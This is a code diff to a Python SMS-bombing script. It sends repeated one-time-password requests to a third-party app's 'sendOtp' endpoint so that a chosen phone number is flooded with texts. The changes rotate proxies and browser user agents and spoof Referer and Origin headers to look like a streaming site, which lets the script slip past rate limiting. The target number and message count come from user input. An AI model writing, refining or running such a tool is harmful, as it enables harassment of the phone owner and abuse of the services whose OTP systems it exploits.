@@ -128,30 +128,27 @@ def send_sms(target_url, formatted_number, proxy_list):
         proxy = {"http": f"http://{random.choice(proxy_list)}"} if proxy_list else None
         
         payload = json.dumps({
-            "dial": formatted_number,
-            "randomValue": ''.join(random.choices(string.ascii_letters + string.digits, k=12)),
-            "timestamp": int(time.time() * 1000)
+            "phoneNumber": formatted_number
         })
         
         headers = {
             "User-Agent": random.choice([
-                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-                "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15",
-                "Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv)"
+                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
+                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
+                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0"
             ]),
-            "Accept": "application/json",
+            "Accept": "application/json, text/plain, */*",
             "Content-Type": "application/json",
-            "Referer": random.choice([
-                "https://www.google.com",
-                "https://www.bing.com",
-                "https://www.yahoo.com"
-            ]),
-            "Connection": "keep-alive",
-            "X-Requested-With": "XMLHttpRequest"
+            "Referer": "https://twist-tv.com/",
+            "Origin": "https://twist-tv.com",
+            "Connection": "keep-alive"
         }
         
         response = requests.post(target_url, headers=headers, data=payload, proxies=proxy, timeout=10)
-        return response.status_code == 200
+        try:
+            return response.json().get("success") is True
+        except:
+            return response.status_code == 200
                 
     except:
         return False
@@ -224,6 +221,7 @@ def main():
         "45.189.119.112:999"
     ]
     
+    # Note: Domain extension .m might be truncated/incorrect, using as provided in screenshot
     target_url = "https://ev-app-api.aws.playco.m/api/auth/v2/sendOtp"
     
     full_number, sms_count = get_user_input()
